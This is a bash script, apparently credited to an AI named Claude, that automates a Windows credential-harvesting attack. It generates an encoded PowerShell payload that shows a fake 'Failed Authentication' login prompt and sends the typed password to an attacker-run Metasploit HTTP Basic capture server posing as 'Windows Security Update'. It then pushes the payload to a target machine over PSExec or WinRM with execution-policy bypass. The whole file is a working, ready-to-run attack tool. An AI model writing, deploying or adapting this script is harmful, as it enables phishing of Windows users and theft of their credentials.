#!/bin/bash

# Windows Credential Harvester Setup Script
# This script sets up and runs a credential harvesting attack using Metasploit
# Author: Claude
# Date: April 16, 2025

# Colors for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Print banner
echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║                                                        ║${NC}"
echo -e "${BLUE}║${GREEN}           Windows Credential Harvester               ${BLUE}║${NC}"
echo -e "${BLUE}║${GREEN}          Based on Rob Fuller's PowerShell Popup       ${BLUE}║${NC}"
echo -e "${BLUE}║                                                        ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] Please run as root${NC}"
  exit 1
fi

# Check for required tools and install if needed
check_and_install_dependencies() {
  echo -e "${YELLOW}[*] Checking for required dependencies...${NC}"
  
  # List of dependencies
  dependencies=("metasploit-framework" "sshpass" "python3" "python3-pip")
  
  for dep in "${dependencies[@]}"; do
    if ! dpkg -l | grep -q $dep; then
      echo -e "${YELLOW}[*] Installing $dep...${NC}"
      apt-get update && apt-get install -y $dep
    else
      echo -e "${GREEN}[+] $dep is already installed${NC}"
    fi
  done
  
  # Install any Python dependencies
  pip3 install pypsrp
  
  echo -e "${GREEN}[+] All dependencies installed successfully${NC}"
}

# PowerShell popup script for credential harvesting
generate_powershell_script() {
  local target_ip=$1
  
  echo -e "${YELLOW}[*] Generating PowerShell script...${NC}"
  
  # Create the PowerShell script
  cat > credential_harvester.ps1 << EOF
\$cred = \$host.ui.promptforcredential('Failed Authentication','',
[Environment]::UserDomainName + "\\" + [Environment]::UserName,[Environment]::UserDomainName);
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true};
\$wc = new-object net.webclient;
\$wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");
\$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
\$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
\$wc.credentials = new-object system.net.networkcredential(\$cred.username, \$cred.getnetworkcredential().password, '');
\$result = \$wc.downloadstring('https://${target_ip}');
EOF

  # Create encoded version for remote execution
  iconv -f UTF8 -t UTF16LE credential_harvester.ps1 > credential_harvester_utf16.ps1
  base64_encoded=$(base64 -w 0 credential_harvester_utf16.ps1)
  
  echo "$base64_encoded" > encoded_script.txt
  echo -e "${GREEN}[+] PowerShell script generated and encoded${NC}"
}

# Setup Metasploit HTTP Basic Auth Capture
setup_metasploit() {
  local local_ip=$1
  
  echo -e "${YELLOW}[*] Setting up Metasploit HTTP Basic Auth Capture...${NC}"
  
  # Create resource script for Metasploit
  cat > http_capture.rc << EOF
use auxiliary/server/capture/http_basic
set SRVHOST 0.0.0.0
set SRVPORT 443
set SSL true
set URIPATH /
set REALM "Windows Security Update"
run
EOF

  echo -e "${GREEN}[+] Metasploit resource script created${NC}"
}

# Deploy the attack
deploy_attack() {
  local target_ip=$1
  local target_user=$2
  local target_pass=$3
  local local_ip=$4
  
  echo -e "${YELLOW}[*] Starting Metasploit in the background...${NC}"
  # Start Metasploit in a new terminal
  gnome-terminal -- bash -c "msfconsole -q -r http_capture.rc; read -p 'Press Enter to close...'" &
  
  # Wait for Metasploit to start
  echo -e "${YELLOW}[*] Waiting for Metasploit to initialize (10 seconds)...${NC}"
  sleep 10
  
  echo -e "${YELLOW}[*] Ready to deploy credential harvester to ${target_ip}${NC}"
  echo -e "${YELLOW}[*] Choose deployment method:${NC}"
  echo -e "  ${GREEN}1) PSExec - Requires admin credentials${NC}"
  echo -e "  ${GREEN}2) WinRM - Windows Remote Management${NC}"
  echo -e "  ${GREEN}3) Generate command only - Manual execution${NC}"
  
  read -p "Enter choice [1-3]: " deployment_method
  
  case $deployment_method in
    1)
      echo -e "${YELLOW}[*] Deploying via PSExec...${NC}"
      msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS ${target_ip}; set SMBUser ${target_user}; set SMBPass ${target_pass}; set PAYLOAD windows/exec; set CMD 'powershell -ep bypass -enc ${base64_encoded}'; run; exit;"
      ;;
    2)
      echo -e "${YELLOW}[*] Deploying via WinRM...${NC}"
      python3 -c "
import pypsrp.client
from pypsrp.powershell import PowerShell, RunspacePool
client = pypsrp.client.Client('${target_ip}', username='${target_user}', password='${target_pass}')
with RunspacePool(client) as pool:
    ps = PowerShell(pool)
    ps.add_script('powershell -ep bypass -enc ${base64_encoded}')
    ps.invoke()
"
      ;;
    3)
      echo -e "${GREEN}[+] Command generated for manual execution:${NC}"
      echo -e "${YELLOW}powershell -ep bypass -enc ${base64_encoded}${NC}"
      ;;
    *)
      echo -e "${RED}[!] Invalid choice${NC}"
      exit 1
      ;;
  esac
  
  echo -e "${GREEN}[+] Attack deployed. Check the Metasploit terminal for captured credentials.${NC}"
}

# Main function
main() {
  echo -e "${YELLOW}[*] Starting setup...${NC}"
  
  # Install dependencies
  check_and_install_dependencies
  
  # Get target information
  read -p "Enter target Windows IP address: " target_ip
  read -p "Enter your local IP address (where Metasploit will listen): " local_ip
  read -p "Enter target Windows username (for deployment): " target_user
  read -s -p "Enter target Windows password (for deployment): " target_pass
  echo ""
  
  # Generate PowerShell script
  generate_powershell_script "$local_ip"
  
  # Setup Metasploit
  setup_metasploit "$local_ip"
  
  # Deploy the attack
  deploy_attack "$target_ip" "$target_user" "$target_pass" "$local_ip"
  
  echo -e "${GREEN}[+] Script execution complete${NC}"
  echo -e "${YELLOW}[*] Monitor the Metasploit window for incoming credentials${NC}"
}

# Run the main function
main
